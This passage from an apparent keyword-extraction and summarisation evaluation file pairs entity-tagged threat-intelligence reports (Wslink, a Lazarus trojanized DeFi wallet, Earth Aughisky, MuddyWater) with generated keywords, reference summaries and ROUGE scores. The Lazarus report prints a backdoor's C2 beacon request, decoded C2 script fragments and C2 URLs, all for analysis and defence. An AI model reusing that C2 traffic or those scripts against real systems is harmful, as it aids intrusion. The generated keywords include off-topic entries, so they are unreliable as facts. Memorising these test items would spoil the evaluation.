service; the module; RSA; memory; the memory; a key; IV; memory; a security key; the server; IP; the method; a Remote Access Trojan; a server; the user; commands; memory; the loader; a service; the initial compromise vector; the malware; security software; a threat actor; compromise rules; a research project.", "ref_text": "<START-1>The PDF describes a new and unique malware loader called Wslink discovered by ESET researchers. Wslink runs as a service on compromised Windows systems and listens on a specified port for incoming connections. Unlike other loaders, Wslink executes received modules directly in memory rather than writing them to disk. It uses a sophisticated cryptographic protocol involving RSA and AES encryption to securely receive and decrypt modules from a command and control server. After establishing a connection, Wslink performs an RSA key exchange to securely transmit a symmetric AES key. The encrypted module is then sent along with a signature and decryption key. The decrypted module is loaded into memory using a library and its export function executed. Modules can reuse Wslink's communication functions to send data over the existing socket. The most recent module and signature are stored globally, allowing the C2 to just send the decryption key for previously sent modules. ESET has seen limited detections of Wslink in Europe, North America, and the Middle East. The initial infection vector is unknown. Samples are packed and code virtualized, hampering analysis. No links to known threat groups have been found. ESET implemented a Wslink client to connect to a modified server and send modules, confirming the protocol and aiding detection methods. The client source code may help beginners in malware analysis by interacting with real malware functions. In summary, Wslink is a sophisticated loader implementing novel techniques like server-based module loading and an RSA-AES encrypted communication protocol. While current impact is low, its capabilities highlight continuing evolution of malware loader tactics. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5514018691588785, "gpt3/lexical/rouge_rouge2": 0.22535211267605634, "gpt3/lexical/rouge_rougeL": 0.3504672897196262, "gpt3/lexical/rouge_rougeLsum": 0.3504672897196262, "gpt3_generated_text": ["ESET researchers have discovered a unique and undocumented malware loader called Wslink that operates as a server and executes received modules in memory. The loader runs as a service and listens on a specified port on all network interfaces. It uses an RSA handshake with a hardcoded 2048-bit public key to securely exchange encryption keys and IVs for AES encryption. The encrypted module is received with a unique identifier and an additional key for decryption. The decrypted module, a regular PE file, is loaded into memory using the MemoryModule library and its first export is executed. The researchers developed their own client implementation of Wslink to mimic its behavior and analyze its communication patterns. The malware has been detected in Central Europe, North America, and the Middle East, but its initial compromise vector is unknown, and there are no similarities suggesting it belongs to a known threat actor group. This analysis serves as a resource for blue teamers and beginners in malware analysis."]}, {"split_name": "val", "sample_id": "val_123", "prompt_text": "Extract the keywords: securelist.com /lazarus - trojanized - defi - app/106195/ [PERSON] Lazarus [PERSON] Trojanized DeFi app for delivering malwareAuthorsGReATFor the [ORG] Lazarus threat actor , financial gain is one of the prime motivations , with a particular emphasis on the cryptocurrency business . As the price of cryptocurrency surges , and the popularity of non - fungible token ( [ORG] NFT ) and decentralized finance ( [ORG] DeFi ) businesses continues to swell , the [ORG] Lazarus group \u2019s targeting of the financial industry keeps evolving . We recently discovered a [ORG] Trojanized DeFi application that was compiled in [DATE] November [DATE] 2021 . This application contains a legitimate program called [PERSON] DeFi [PERSON] Wallet that saves and manages a cryptocurrency wallet , but also implants a malicious file when executed . This malware is a full - featured backdoor containing sufficient capabilities to control the compromised victim . After looking into the functionalities of this backdoor , we discovered numerous overlaps with other tools used by the [ORG] Lazarus group . The malware operator exclusively used compromised web servers located in [GPE] South [GPE] Korea for this attack . To take over the servers , we worked closely with the [ORG] KrCERT and , as a result of this effort , we had an opportunity to investigate a [ORG] Lazarus group C2 server . The threat actor configured this infrastructure with servers set up as multiple stages . The [ORDINAL] first stage is the source for the backdoor while the goal of the [ORDINAL] second stage servers is to communicate with the implants . This is a common scheme used in [ORG] Lazarus infrastructure . [PERSON] BackgroundIn [DATE] the [DATE] middle [DATE] of [DATE] December [DATE] 2021 , we noticed a suspicious file uploaded to [ORG] VirusTotal . At [ORDINAL] first glance , it looked like a legitimate application related to decentralized finance ( DeFi ) ; however , looking closer we found it initiating an infection scheme . When executed , the app drops both a malicious file and an installer for a legitimate application , launching the malware with the created Trojanized installer path . Then , the spawned malware overwrites the legitimate application with the [ORG] Trojanized application . Through this process , the [ORG] Trojanized application gets removed from the disk , allowing it to cover its tracks.1/8Infection timeline [ORG] Initial infectionWhile it \u2019s still unclear how the threat actor tricked the victim into executing the [ORG] Trojanized application social media . The hitherto unknown infection procedure starts with the [ORG] Trojanized application . This installation package is disguised as a DeFi [PRODUCT] Wallet program containing a legitimate binary repackaged with the installer . Upon execution , it acquires the next stage malware path ( C:\\ProgramData\\Microsoft\\GoogleChrome.exe ) and decrypts it with a [QUANTITY] one - byte [LAW] XOR ( Key : [LAW] 0x5D ) . In the process of creating this next malware stage , the installer writes the [ORDINAL] first eight bytes including the \u2018 MZ \u2019 header to the file GoogleChrome.exe and pushes the remaining [CARDINAL] 71,164 bytes from the data section of the [ORG] Trojanized application . Next , the malware loads the resource CITRIX_MEETINGS from its body and saves it to the path [GPE] C:\\ProgramData\\Microsoft\\CM202025.exe . The resulting file is a legitimate DeFi [PERSON] Wallet application . Eventually , it executes the previously created malware with its file name as a parameter : C:\\ProgramData\\Microsoft\\GoogleChrome.exe \u201c [ current file name]\u201dMalware creation diagram benign instance of [PRODUCT] the [PRODUCT] Google [PRODUCT] Chrome browser . Upon launch , the malware checks if it was provided with [CARDINAL] one argument before attempting to copy the legitimate application \u201c [PERSON] C:\\ProgramData\\Microsoft\\CM202025.exe \u201d to the path given as the command line parameter , which means overwriting the original Trojanized installer , almost certainly in an attempt to conceal its prior existence . Next , the malware executes the legitimate file to deceive the victim by showing its benign installation process . When the user executes the newly installed program , it shows the DeFi [PRODUCT] Wallet software built with the public source code[1].2/8Screenshot of the manipulated applicationNext , the malware starts initializing the configuration information . The configuration shows the structure shown in the table below , consisting of flags , C2 server addresses , victim identification value , and time value . As the structure suggests , this malware can hold [CARDINAL] up [CARDINAL] to [CARDINAL] five C2 addresses , but [CARDINAL] only [CARDINAL] three [CARDINAL] C2 servers are included in this case . Offset 0x16B0Length(bytes ) Description 8Flag for starting C2 operation [PERSON] Random value to select [CARDINAL] C2 server [PERSON] Random value for victim identifier C2 server address [CARDINAL] C2 server address [CARDINAL] C2 server address [CARDINAL] C2 server address [CARDINAL] C2 server address [PERSON] Buffer for system information Full cmd.exe path Temporary folder path [ORG] Time to start backdoor operation [ORG] Time interval [PERSON] Flag for gathering logical drives [PERSON] Flag for enumerating session information The time value for gathering logical drive and session informationThe malware randomly chooses a [CARDINAL] C2 server address and sends a beacon signal to it . This signal is a hard - coded \u2018 0x60D49D94 \u2019 DWORD without encryption ; the response data returned from the C2 carries the same value . If the expected value from the C2 server is received , the malware starts its backdoor operation . Following further communication with the C2 , the malware encrypts data by a predefined method . The encryption is done via RC4 and the hard - coded key 0xD5A3 before additionally being encoded with base64.The malware generates [ORG] POST parameters with hard - coded names . The request type ( [DATE] msgID ) , victim identification value , and a randomly generated value are merged into the \u2018 jsessid \u2019 parameter . It also uses the \u2018 cookie \u2019 parameter to store [CARDINAL] four randomly generated [QUANTITY] four - byte values . These values are again encrypted with RC4 and additionally base64 encoded . Based on our investigation of the C2 script , we observed this malware not only uses a parameter named \u2018 jsessid \u2019 , but also \u2018 jcookie \u2019 as well.3/8Structure of \u2018 jsessid \u2019 parameterThe following HTTP request shows the malware attempting to connect to the C2 with the request type \u2019 60d49d98\u2032 and a randomly generated cookie value.12345678POST /include / inc.asp HTTP/1.1Content - Type : application / x - www - form - urlencodedUser - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 7.0 ; [EVENT] Windows [EVENT] NT [EVENT] 6.1 ; WOW64 ; Trident/7.0 ; [DATE] SLCC2 ; .NET CLR 2.0.50727 ; .NET CLR 3.5.30729 ; .NET [ORG] CLR [ORG] 3.0.30729 ; [ORG] Media [ORG] Center PC [CARDINAL] 6.0 ; .NET4.0C ; .NET4.0E ; InfoPath.3)Host : emsystec.comContent - Length : [CARDINAL] 80Cache - Control : no - cachejsessid=60d49d980163be8f00019f91&cookie=29f23f917ab01aa8lJ3UYA==2517757b7dfb47f1Depending on the response from the C2 , the malware performs its instructed backdoor task . It carries various functionalities to gather system information and control the victim machine . [PERSON] Command [PERSON] Set [PERSON] time configuration with the current time interval ( default is [CARDINAL] 10 ) value [PERSON] Set time configuration with delivered data from C2 server Gather system information , such as [ORG] IP address , computer name , OS version , CPU architecture Collect drive information including type and free size Enumerate files ( with file name , size , time ) Change working directory [NORP] Connect to a given [ORG] IP address File timestamping [ORG] Execute [ORG] Windows command Securely delete a file Spawn process with [PERSON] CreateProcessW [PERSON] API [PERSON] Spawn process with [ORG] CreateProcessAsUserW API Spawn process with high integrity level [PERSON] Download file from C2 server and save to given file path Send file creation time and contents [PRODUCT] Add files to .cab file and send it to the [CARDINAL] C2 server Collect a list of files at the given path Send the configuration to the C2 server Receive new configuration from the [CARDINAL] C2 server Set config to the current time [TIME] Sleep [TIME] 0.1 [TIME] seconds and continueLazarus only used compromised web servers located in [GPE] South [GPE] Korea in this campaign . As a result of working closely with the [ORG] KrCERT in taking down some of them , we had a chance to look into the corresponding [CARDINAL] C2 script from [CARDINAL] one of the compromised servers . The script described in this section was discovered in the following path:4/81 url script is a [ORG] VBScript . [ORG] Encode [ORG] ASP file , commonly used by the [ORG] Lazarus group in their [CARDINAL] C2 scripts . After decoding , it shows the string \u2019 60d49d95\u2032 as an error response code , whereas the string \u2019 60d49d94\u2032 is used as a success message . In addition , the connection history is saved to the file \u2018 stlogo.jpg \u2018 and the C2 address for the next stage is stored in the file \u2018 globals.jpg \u2018 located in the same folder . Configuration of C2 scriptThis script checks what value is delivered in the \u2018 jcookie \u2019 parameter and , if it \u2019s longer than [CARDINAL] 24 characters , it extracts the [ORDINAL] first [CARDINAL] eight characters as [DATE] msgID . Depending on the [DATE] msgID value , it calls different functions . The backdoor command and command execution result delivered by the backdoor get stored to global variables . We have seen this scheme in operation before with the Bookcode[2 ] cluster . This script uses the following variables as flags and buffers to deliver data and commands between the backdoor and a [ORDINAL] second stage C2 server : lFlag : flag to signal that there is data to deliver to the backdoor [ORG] lBuffer : buffer to store data to be later sent to the backdoor [ORG] tFlag : flag to signal that there is a response from the backdoor tBuffer : buffer to store incoming data from the backdoormsgIDFunction name Description60d49d98TFConnect60d49d99TConnect60d49d9aLConnect60d49d9cCheck60d49d9d the othersLogDown N / AAttributionSave the \u2018 TID \u2019 value ( victim identifier ) to the log file , send \u2018 jcookie \u2019 value with the client \u2019s IP address after acquiring the next stage C2 address from the config file ( globals.jpg ) . Forward the response from the next stage server to the client . Deliver the command to the backdoor : If the [PRODUCT] lFlag is \u2018 true \u2019 , send [ORG] lBuffer to the client . [PERSON] Reset \u2018 [PERSON] lBuffer \u2019 and set lFlag to \u2018 false \u2019 . Otherwise , reset \u2018 tBuffer \u2019 and set [ORG] tFlag to \u2018 false \u2019 . Send the command and return the command execution result : Set \u2018 lBuffer \u2019 value to \u2018 jcookie \u2019 parameter , delivering \u2018 tBuffer \u2019 to the client . Retrieve host information ( computer name , OS version ) . Delete the configuration file , which saves the C2 \u2019s next stage address , if it exists . Then save the new configuration with delivered data through the \u2018 jcookie \u2019 parameter . Deliver log file after base64 encoding and then delete it . Write connections with unknown / unexpected [DATE] msgID ( request type ) data to a log file , entries are tagged with \u2018 xxxxxxxx\u2019 . We believe with high confidence that the [ORG] Lazarus group is linked to this malware as we identified similar malware in the [ORG] CookieTime cluster . The [ORG] CookieTime cluster , called LCPDot by [ORG] JPCERT , was a malware cluster that was heavily used by the [ORG] Lazarus group until recently . We \u2019ve seen [ORG] Lazarus group target the defence industry using the [ORG] CookieTime cluster with a job opportunity decoy . We have already published several reports about this cluster to our [ORG] Threat [ORG] Intelligence [ORG] Service customers , and we identified a [ORG] Trojanized [ORG] Citrix application discovered in the latest investigation , and the previously discovered Trojanized application , are almost identical . They share , among other things , the same [CARDINAL] C2 communication method , backdoor functionalities , random number generation routine and the same method to encrypt communication data . Also , this malware was mentioned in an article by [ORG] Ahnlab discussing connections with the CookieTime ( aka LCPDot ) malware.5/8Same backdoor switch of old CookieTime malwareIn turn , we identified that the [ORG] CookieTime cluster has ties with the [PERSON] Manuscrypt and ThreatNeedle clusters , which are also attributed to the [ORG] Lazarus group . This does n\u2019t only apply to the backdoor itself , but also to the [CARDINAL] C2 scripts , which show several overlaps with the ThreatNeedle cluster . We discovered almost all function and variable names , which means the operators recycled the code base and generated corresponding [CARDINAL] C2 scripts for the malware . ThreatNeedle C2 script from roit.co[.]kr / xyz / adminer / edit_fail_decoded.asp 1functIon [ORG] getIpAddress()23456789On ErroR resume nextDim ipip = Request . SErVervariables(\"HTTP_CLIENT_IP\")If ip=\"\"THenIp = ReQUest . ServervaRiAbLes(\"HTTP_X_FORWARDED_FOR\")If ip=\"\"ThEnip = request . ServerVaRiables(\"REMOTE_ADDR\")End IfC2 script of this case123456789fUnctioN GetIpAddress()ON Error [PERSON] Resume [PERSON] NextDim [PERSON] iPip = [ORG] ReqUest . ServerVaRiables(\"HTTP_CLIENT_IP\")If ip=\"\"THEniP = Request . [NORP] SErverVariaBleS(\"HTTP_X_FORWARDIf ip=\"\"thenip = reQuest . ServErVariables(\"REMOTE_ADDR\")EnD IF10End if11GEtIpAdDress = ipEnd FuNction12Almost identical scripts to fetch [ORG] IP address of client10EnD If11GEtipAddreSs = ipEnd FUnction12ThreatNeedle C2 script from : edujikim[.]com [ORG] / pay_sample [ORG] / INIstart.asp [ORG] 1Sub writeDataToFile(strFileName , byData)23456789Dim [PERSON] objFSO , objFile , strFilePathConst [ORG] ForAppending = 8strFilePath = Server . MapPath ( \" . \" ) & \" \\ \" & strFileNameSet [PERSON] objFSO = CreateObject(\"Scripting . FileSystemObject\")Set objFile = objFSO.OpenTextFile(strFilePath,10ForAppending , [PERSON] True)11objFile . Write byData12objFile . Close13End [ORG] SubC2 script of this case123456789Sub WritedatA(filepath , byData)dim [PERSON] objFSO , [PERSON] oBJFileConSt [PERSON] ForAppEnDing=8SetobjFsO = CreateObject(\"Scripting . FileSystemObject\")SeTobjFIle = objFso . OpENTextFile(filepaTh , FoRAppending , True)objFilE.Write ByDatAobjFIle . CLoseEnD Sub106/8Similar scripts to save data to a file ConclusionsIn a previous investigation we discovered that the [ORG] BlueNoroff group , which is also linked to [ORG] Lazarus , compromised another [LOC] DeFi wallet program called [PRODUCT] MetaMask . As we can see in the latest case , the [ORG] Lazarus and [ORG] BlueNoroff groups attempt to deliver their malware without drawing attention to it and have evolved sophisticated methods to lure their victims . The cryptocurrency and blockchain - based industry continues to grow and attract high levels of investment . For this reason , we strongly believe [ORG] Lazarus \u2019s interest in this industry as a major source of financial gain will not diminish any time soon . Indicators of [ORG] CompromiseTrojanized DeFi application hxxp://emsystec[.]com / include / inc[.]asp hxxp://www[.]gyro3d[.]com / common / faq[.]asp hxxp://www[.]newbusantour[.]co[.]kr / gallery / [ORG] left[.]asp hxxp://ilovesvc[.]com [ORG] / HomePage1 [ORG] / Inquiry / privacy[.]asp hxxp://www[.]syadplus[.]com / search / search_00[.]asp hxxp://bn - cosmo[.]com / customer / board_replay[.]aspSecond stage [CARDINAL] C2 servers ( Legitimate , compromised ) hxxp://softapp[.]co[.]kr / sub / cscenter / privacy[.]asp hxxp://gyro3d[.]com / mypage / faq[.]asp MITRE ATT&CK MappingThis table contains all the TTPs identified in the analysis of the activity described in this report . [ORG] Tactic [ORG] ExecutionPersistenceDefense [ORG] EvasionDiscoveryTechnique [ORG] Technique [ORG] Name [ORG] T1204.002 [ORG] User Execution : Malicious File T1547.001 Boot or [PERSON] Logon [PERSON] Autostart Execution : Registry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] FolderUse [ORG] Trojanized application to drop malicious backdoorRegister dropped backdoor to the [PERSON] Run registry key Indicator Removal on Host : File Deletion The [ORG] Trojanized application overwrites itself after creating a legitimate application to remove its [ORG] traceT1070.004T1070.006 [ORG] Indicator [ORG] Removal [ORG] on [ORG] Host : [ORG] TimestompT1057T1082T1083 [ORG] T1124Backdoor capable of timestomping specific files [PRODUCT] Process [PRODUCT] Discovery [PRODUCT] List running processes with backdoor System Information Discovery Gather IP address , computer name , OS version , and CPU architecture with backdoor File and Directory Discovery List files in some directories with backdoor [PERSON] System [PERSON] Time Discovery7/8Command and ControlExfiltrationT1041Gather system information with backdoorUse HTTP as [CARDINAL] C2 channel with backdoorT1071.001 Application Layer Protocol : Web Protocols T1573.001 Encrypted Channel : Symmetric Cryptography Use RC4 encryption and base64 with backdoor [ORG] Exfiltration [ORG] Over [ORG] C2 [ORG] Channel [ORG] Exfiltrates gathered data over C2 channels with backdoor[1 ] url [ [CARDINAL] 2 ] [ORG] APT [ORG] Intel report : [PERSON] Lazarus [PERSON] Covet [PERSON] Covid19 [PERSON] Related [PERSON] IntelligenceBackdoor", "generated_text": "the malware; Lazarus; malware; a cryptocurrency wallet; Bitcoin; a malicious file; Malware; a backdoor; control; the attackers; malicious files; a malicious DeFi Wallet; the malware; the victim; social media; the malware; the installer; the installer; GoogleChrome.exe; the malware; a valid customer; South Korea; the malicious malware; compromise; the C2 server; servers; the malicious malware; the infection process; the attackers; the malware.", "ref_text": "<START-1>The cybercriminal group Lazarus has been trojanizing decentralized finance (DeFi) applications to deliver malware and gain financial profits. Researchers discovered a trojanized DeFi wallet app compiled in November 2021 that implants a backdoor when executed. The backdoor allows full control of the compromised system. The infection starts with a trojanized installer that drops the next-stage backdoor and a legitimate DeFi wallet app. It launches the backdoor, overwriting itself with the legitimate app to cover its tracks. The backdoor disguises itself as Google Chrome and connects to command and control servers, receiving directives to gather system info, download files, and control the victim's machine. The Trojanized application gets removed from the disk, allowing it to cover its tracks. The malware uses encrypted HTTP requests to communicate with multistage command servers hosted on compromised South Korean websites. Analysis of a command script shows overlaps with previous Lazarus malware, like CookieTime/LCPDot. The backdoor functionality and infrastructure links it to Lazarus campaigns targeting the defense industry. Lazarus continues to evolve techniques to compromise cryptocurrency and blockchain businesses, drawn by financial profits as the industry grows. The report details indicators of compromise and ATT&CK techniques used by the malware. It highlights the ongoing threat Lazarus poses to the cryptocurrency sector through trojanized apps and sophisticated backdoors for control and data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4444444444444445, "gpt3/lexical/rouge_rouge2": 0.08459214501510574, "gpt3/lexical/rouge_rougeL": 0.1981981981981982, "gpt3/lexical/rouge_rougeLsum": 0.1981981981981982, "gpt3_generated_text": ["The article discusses the discovery of a Trojanized DeFi application by the Lazarus threat actor. The application, called DeFi Wallet, is a legitimate program for managing a cryptocurrency wallet but also contains a malicious file. This malware is a full-featured backdoor that allows the attackers to control the compromised victim. The malware operator exclusively used compromised web servers in South Korea for this attack. The article provides details about the infection process and the configuration of the malware. The researchers worked closely with KrCERT to investigate a Lazarus group C2 server. Overall, the article highlights the evolving targeting of the financial industry by the Lazarus group and their focus on cryptocurrency businesses."]}, {"split_name": "val", "sample_id": "val_124", "prompt_text": "Extract the keywords: www.trendmicro.com /en_us / research/22 / j / tracking - earth - aughiskys - malware - and - changes.html Tracking Earth Aughisky \u2019s Malware and Changes \u22ee 10/4/2022For over [DATE] 10 [DATE] years , security researchers have been observing and keeping tabs of [ORG] APT group [PERSON] Earth [PERSON] Aughisky \u2019s malware families and the connections , including previously documented malware that have yet to be attributed . By : CH Lei [DATE] October 04 , [DATE] 2022 [DATE] Read [DATE] time : [CARDINAL] 3 min ( [CARDINAL] 872 words)For security researchers and analysts monitoring advanced persistent threat ( [ORG] APT ) groups \u2019 attacks and tools , [PERSON] Earth [PERSON] Aughisky ( also known as Taidoor ) is among the more active units that consistently make security teams vigilant . Over [DATE] the [DATE] last [DATE] decade , the group has continued to make adjustments in the tools and malware deployments on specific targets located in [GPE] Taiwan and , more recently , [GPE] Japan . Our research paper , \u201c [WORK_OF_ART] The [WORK_OF_ART] Rise [WORK_OF_ART] of [WORK_OF_ART] Earth [WORK_OF_ART] Aughisky : [WORK_OF_ART] Tracking [WORK_OF_ART] the [WORK_OF_ART] Campaigns [WORK_OF_ART] Taidoor [WORK_OF_ART] Started , \u201d lists all the malware attributed to the group , the connections of these malware families and tools with other [ORG] APT groups , and the latest updates in illicit activities potentially connected to real - world changes . Our research also covers recommendations and potential opportunities from the changes this [ORG] APT group appears to be undergoing . Malware families attributedThis blog post summarizes and highlights some of the malware families and tools with components that have yet to be identified , reported , or attributed to the group . For a full list of all the malware families and tools we attribute to [PERSON] Earth [PERSON] Aughisky , download our research here . [PERSON] Roudan ( also known as Taidoor)While the name [PRODUCT] Taidoor has been interchangeably used to refer to the group and the malware , we analyzed that the threat actors named this malware family [PERSON] Roudan while looking at both the backdoor and backdoor builder . This classic [PRODUCT] Earth [PRODUCT] Aughisky malware , which was [ORDINAL] first disclosed over [DATE] 10 [DATE] years [DATE] ago , has been observed for the different formats the group employed for callback traffic as it contains an encoded [ORG] MAC address and data.1/6Figure [CARDINAL] 1 . Some of the builders taken from different samples of [PRODUCT] RoudanFigure [PRODUCT] 2 . [PERSON] Roudan network traffic with encoded [ORG] MAC addressesLuckDLLStill unreported , LuckDLL is a relatively new backdoor observed to be active after [DATE] 2020 . The public key is embedded inside the malware configuration and subsequently communicates with the [ORG] C&C server . LuckDLL then proceeds to generate a random session key and initialization vector ( IV ) to encrypt the traffic . The public key encrypts the session key and IV during initial communication , and shared with the C&C.2/6Figure [CARDINAL] 3 . Public key ( top ) and session key ( bottom)GrubbyRATFollowing our sensors \u2019 observations , GrubbyRAT is deployed only when [PERSON] Earth [PERSON] Aughisky is interested in important targets that follow certain criteria . Still unreported , the configuration file is sometimes installed under an existing application or general system folder and uses the same file name as the component . This suggests that this [ORG] RAT is installed manually and after the threat actor has gained administrative privileges and control in the infected system . Figure [CARDINAL] 4 . Decrypted GrubbyRAT configurationTaikite ( also known as SVCMONDR)While previously reported as SVCMONDR , this malware has yet to be attributed to [PERSON] Earth [PERSON] Aughisky . Previously identified with a [DATE] 2015 report identifying a vulnerability , some samples of this dropped file observed in [GPE] Taiwan had a .pdb similar to the [ORG] APT group \u2019s other malware families and tools . The [ORG] C&C callback traffic is encoded in [GPE] Base64 and showed a detailed feedback data structure and behavior analysis.3/6Figure [CARDINAL] 5 . The Taikite .pdb stringFigure [CARDINAL] 6 . Taikite trafficSiyBotThis backdoor has yet to be reported , likely because we observed this tool as being deployed less and only in few attack incidences . SiyBot abuses earlier versions of public services such as Gubb and 30 Boxes to perform [ORG] C&C communication , wherein the necessary credential or token can be found in the malware configuration . We observed this backdoor to support only a few functions based on the commands we found . Figure [CARDINAL] 7 . Embedded [CARDINAL] 30 Boxes credential in the malwareConnectionsWe feature some of the overlaps and connections we found with [PERSON] Earth [PERSON] Aughisky \u2019s malware and tools . [PERSON] Roudan and [GPE] SiyBotWe found the same website being used to host [PERSON] Roudan and SiyBot , as well as [NORP] ASRWEC downloader ( a tool we also attribute to [PERSON] Earth [PERSON] Aughisky ) payload in the same repository.4/6Figure 8 . [PERSON] Roudan ( left ) and [PERSON] SiyBot ( right ) payload in the same repositoryRoudan , [PERSON] Taleret , and [ORG] TaikiteTaleret is another malware family that has been identified or suspected with [PERSON] Earth [PERSON] Aughisky for [DATE] years . We found overlaps in the [ORG] C&C servers being used by these malware families , as well as the same hashes , logging mechanisms , and blog hosts between [PERSON] Taleret and earlier versions of [PERSON] Roudan payload . Figure [CARDINAL] 9 . Taleret \u2019s special log file ( left ) compared with [ORG] Roudan \u2019s earlier version ( right)Figure [CARDINAL] 10 . [PERSON] Taleret configuration ( left ) and [ORG] Comeon downloader payload ( [PERSON] Roudan , right ) on the same blogInsights5/6As [PERSON] Earth [PERSON] Aughisky is [CARDINAL] one of the few [ORG] APT groups that has exercised longevity in cyberespionage , security analysts and teams have collected and continue to gather data to evaluate the group \u2019s skills , developments , relations with other [ORG] APT groups , and their activities . Samples of their malware families and tools allow security teams to gain an understanding of the level of sophistication \u2013 or lack of it \u2013 of the group \u2019s operations , connection , and even changes possibly affecting them from the real - world complexities such as politics and geographic objectives . To find the complete details of our malware analyses , insights , and attribution connections , download our research paper , \u201c [WORK_OF_ART] The [WORK_OF_ART] Rise [WORK_OF_ART] of [WORK_OF_ART] Earth [WORK_OF_ART] Aughisky : Tracking [ORG] the [ORG] Campaigns [ORG] Taidoor [ORG] Started . \u201dIndicators of [PERSON] Compromise ( IOCs)For a full list of the IOCs , find them here.6/6", "generated_text": "research; Tracking; Earth Aughisky; Taidoor; malware families; tools; Roudan; Rodan; Java; the group; tools; RAT; Command; control; the malware; MAC addresses; data; the framework; the malware; JavaScript; kernel; Windows; memory; the network; execution; the conflict; the network; indicators; compromise; IP addresses; the threat actors; updates; the group; the latest malicious activity; the threat actors.", "ref_text": "<START-1>The PDF describes research by Trend Micro tracking the malware and changes of the advanced persistent threat (APT) group Earth Aughisky (also known as Taidoor). Earth Aughisky has been active for over 10 years targeting Taiwan and Japan. The research profiles malware families attributed to Earth Aughisky like Roudan/Taidoor, LuckDLL, GrubbyRAT, Taikite, and SiyBot. Some are newly revealed or attributed. The malware uses various techniques for command and control, encryption, and more. Connections between the malware families are outlined, such as overlap in infrastructure like domains and hosting. Similarities in logging, hashes, configuration, and other technical attributes link families like Roudan, Taleret, and Taikite. Earth Aughisky continually adjusts its malware and tactics. The research allows tracking of the group's skills, relations to other APTs, and real-world motivations. Their longevity makes them an important target for monitoring. In summary, the research provides in-depth analysis of multiple malware families attributed to Earth Aughisky over more than a decade, including revealing new families and connections between them. This aids threat intelligence efforts against this persistent cyberespionage group. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.478386167146974, "gpt3/lexical/rouge_rouge2": 0.19710144927536233, "gpt3/lexical/rouge_rougeL": 0.24207492795389052, "gpt3/lexical/rouge_rougeLsum": 0.24207492795389052, "gpt3_generated_text": ["The article discusses the research conducted on the APT group Earth Aughisky, also known as Taidoor, and its malware families and tools. The researchers have been tracking the group's activities for over 10 years and have identified various malware families attributed to the group. One of the malware families analyzed is Roudan, which has been observed for its different formats and callback traffic. Another newly discovered backdoor is LuckDLL, which encrypts its traffic using a session key and initialization vector. GrubbyRAT is deployed by Earth Aughisky for specific targets and is installed manually after gaining administrative privileges. Taikite, previously reported as SVCMONDR, has a similar.pdb file as other malware families attributed to the group. SiyBot is another backdoor that is deployed less frequently and abuses public services for communication. The article also discusses the connections and overlaps between different malware and tools used by Earth Aughisky. Overall, the research provides insights into the activities and updates of the APT group, as well as recommendations for security teams."]}, {"split_name": "val", "sample_id": "val_125", "prompt_text": "Extract the keywords: This website uses cookies to improve your experience . Accept AcceptRead More Read MoreBLOGBLOGA dive into [ORG] MuddyWater [ORG] APT targeting A dive into [PRODUCT] MuddyWater [PRODUCT] APT targeting [LOC] Middle - [LOC] East [LOC] Middle - EastP [LOC] O [LOC] S T E D B Y 2 1A D M I N O N 02/ N O V /27MuddyWater is a threat actor that caught our attention for their extensive use of \u201c [WORK_OF_ART] Living [WORK_OF_ART] off [WORK_OF_ART] the [WORK_OF_ART] Land \u201d attacks in a targeted campaign aimed at [LOC] the [LOC] Middle [LOC] East . During our investigation we reconstruct the evolution of the vectors used and how the group operates to target their victims , evade detections and move laterally inside the compromised infrastructures . MuddyWater Summary MuddyWater SummaryMuddyWater is an [ORG] APT group that has been active throughout [DATE] 2017 , targeting victims in [LOC] Middle [LOC] Eastwith in - memory vectors leveraging on [ORG] Powershell , in a family of attacks now identi\ufb01ed as \u201c Living off the   land \u201d , as they do n\u2019t require the creation of new binaries on the victim \u2019s machine , thus maintaining a low detection pro\ufb01le and a low forensic footprint . MuddyWater has been assigned by [PRODUCT] PaloAlto in an article that describes how the actor \u2019s [ORG] POWERSTATS , evolved over [DATE] the [DATE] past [DATE] year . For the sake of clarity we decided toThe name MuddyWater backdoor , called [ORG] POWERSTATS maintain the same names . The operators behind [ORG] MuddyWater are likely espionage motivated , we derive this information from the analysis of data and backdoors behaviors . We also \ufb01nd that despite the strong preponderance of   victims from [GPE] Pakistan , the most active targets appear to be in : [GPE] Saudi [GPE] Arabia the victims we identify a variety of entities with a stronger focus at Governments companies . [GPE] Saudi [GPE] Arabia , UAEUAE and [GPE] IraqIraq . AmongstGovernments , [ORG] TelcosTelcos and OilOilBy tracking the operations we \ufb01nally \ufb01gure out that the originating country is likely to be [GPE] Iran , while it    remains harder to ascertain whether [ORG] MuddyWater is state sponsored or a criminal organization incline to espionage . Finally we show how the threat evolved since its \ufb01rst public report , the techniques used and how the   actors adapted to various public reports of their activities . [PERSON] Timeline [PERSON] TimelineIn order to understand how the threat evolved and to understand the whole picture , we have to reconstruct the timeline of the various discoveries and piece together the \ufb01ndings published .   [CARDINAL] 18 / Sep/2017 \u2013 [ORDINAL] First public report [CARDINAL] 18 / Sep/2017 \u2013 [ORDINAL] First public reportTo the best of our knowledge the \ufb01rst public report of this speci\ufb01c threat came from our intelligence    team ( please let us know if any prior \ufb01nding was published before ) with the \ufb01rst detection happening    during [DATE] the [DATE] second [DATE] half [DATE] of [DATE] September . At that time the analysis from [ORG] ReaQta - Hive shows the full threat \u2019s GitHub to conceal and download its payload . Shortly after the information is made public , [ORG] GitHub blocks the account and [ORG] MuddyWater \u2019s operators quickly shift to [PERSON] PastebinPastebin as their main repository . \"Living off the land \" RAT downloads [DATE] 1st stage from cloned fb / react repo , persists in registry & task , uses breached websites as c&c pic.twitter.com/hqwLmIKHXW \u2014 [ORG] ReaQta ( @ReaQta ) [DATE] September [DATE] 18 , [DATE] 201726 / Sep/2017 \u2013 [ORDINAL] First public analysis 26 / Sep/2017 \u2013 [ORDINAL] First public analysisAt [DATE] the [DATE] end [DATE] of [DATE] September , [ORG] MalwareBytes publishes an analysis of [ORG] POWERSTATS , showing how the threat is now downloading its payload from Pastebin . With the exception of the repository location , we con\ufb01rm that the behavior of the analyzed backdoor is the same as the one identi\ufb01ed by [ORG] ReaQta a few    [CARDINAL] 3 / Oct/2017 \u2013 MuddyWater starts to embed the payload [CARDINAL] 3 / 